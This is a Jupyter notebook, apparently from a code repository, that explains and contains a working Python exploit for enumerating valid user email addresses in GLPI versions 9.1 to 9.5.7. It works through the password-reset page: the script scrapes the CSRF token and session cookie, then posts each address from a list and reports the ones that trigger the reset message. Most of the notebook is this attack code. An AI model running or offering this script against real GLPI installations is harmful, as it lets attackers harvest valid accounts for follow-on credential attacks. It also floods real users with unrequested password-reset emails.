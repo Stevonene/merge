{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- This script is designed to test for a vulnerability in GLPI version 9.1 to 9.5.7 that allows an attacker to enumerate valid usernames via the password reset functionality.\n",
    "  \n",
    "- <u>Step-by-step explanation:</u>\n",
    "  1. First, the script sends a GET request to the password reset page to obtain the CSRF token and session cookie.\n",
    "  \n",
    "  ```py\n",
    "    response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')\n",
    "  ```"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- The script performs the following steps:\n",
    "  1. Sends a GET request to the GLPI lost password page to obtain the CSRF token and session cookie.\n",
    "  2. Reads a list of email addresses from a file.\n",
    "  3. For each email address in the list, sends a POST request to the lost password page with the email address and the obtained CSRF token and session cookie.\n",
    "  4. Parses the response from the server to determine if the email address is associated with a user account.\n",
    "  5. Prints a message indicating whether the email address is associated with a user account."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- **The vulnerability exists in GLPI version 9.1 to 9.5.7, and this exploit targets version 9.5.7.**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Exploit Title: GLPI 9.5.7 - Username Enumeration\n",
    "# Date: 04/29/2023\n",
    "# Author: Rafael B.\n",
    "# Vendor Homepage: https://glpi-project.org/pt-br/\n",
    "# Affected Versions: GLPI version 9.1 <= 9.5.7\n",
    "# Software: https://github.com/glpi-project/glpi/releases/download/9.5.7/glpi-9.5.7.tgz\n",
    "\n",
    "\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "# Send a GET request to the page to receive the csrf token and the cookie session\n",
    "response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')\n",
    "\n",
    "# Parse the HTML using BeautifulSoup\n",
    "soup = BeautifulSoup(response.content, 'html.parser')\n",
    "\n",
    "# Find the input element with the CSRF token\n",
    "csrf_input = soup.find('input', {'name': lambda n: n and n.startswith('_glpi_csrf_')})\n",
    "\n",
    "# Extract the CSRF token if it exists\n",
    "if csrf_input:\n",
    "    csrf_token = csrf_input['value']\n",
    "\n",
    "# Extract the session cookie\n",
    "session_cookie_value = None\n",
    "if response.cookies:\n",
    "    session_cookie_value = next(iter(response.cookies.values()))\n",
    "# Set the custom url where the GLPI recover password is located \n",
    "url = \"http://127.0.0.1:80/glpi/front/lostpassword.php\"\n",
    "headers = {\"User-Agent\": \"Windows NT 10.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"http://127.0.0.1\", \"Connection\": \"close\", \"Referer\": \"http://127.0.0.1/glpi/front/lostpassword.php?lostpassword=1\", \"Upgrade-Insecure-Requests\": \"1\", \"Sec-Fetch-Dest\": \"document\", \"Sec-Fetch-Mode\": \"navigate\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-User\": \"?1\"}\n",
    "\n",
    "# Open the email list file and read each line\n",
    "with open('emails.txt', 'r') as f:\n",
    "    email_list = f.readlines()\n",
    "\n",
    "# Loop through the email list and make a POST request for each email\n",
    "for email in email_list:\n",
    "    email = email.strip()\n",
    "    data = {\"email\": email, \"update\": \"Save\", \"_glpi_csrf_token\": csrf_token}\n",
    "    cookies = {\"glpi_f6478bf118ca2449e9e40b198bd46afe\": session_cookie_value}\n",
    "    freq = requests.post(url, headers=headers, cookies=cookies, data=data)\n",
    "\n",
    "    # Do a new GET request to get the updated CSRF token and session cookie for the next iteration\n",
    "    response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')\n",
    "    soup = BeautifulSoup(response.content, 'html.parser')\n",
    "    csrf_input = soup.find('input', {'name': lambda n: n and n.startswith('_glpi_csrf_')})\n",
    "    if csrf_input:\n",
    "        csrf_token = csrf_input['value']\n",
    "    session_cookie_value = None\n",
    "    if response.cookies: \n",
    "        session_cookie_value = next(iter(response.cookies.values()))\n",
    "\n",
    "    # Parse the response and grep the match e-mails\n",
    "    soup = BeautifulSoup(freq.content, 'html.parser')\n",
    "    div_center = soup.find('div', {'class': 'center'})\n",
    "    Result = (f\"Email: {email}, Result: {div_center.text.strip()}\")\n",
    "    if \"An email has been sent to your email address. The email contains information for reset your password.\" in Result:\n",
    "        print (\"\\033[1;32m Email Found! -> \" + Result)\n",
    "            \n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
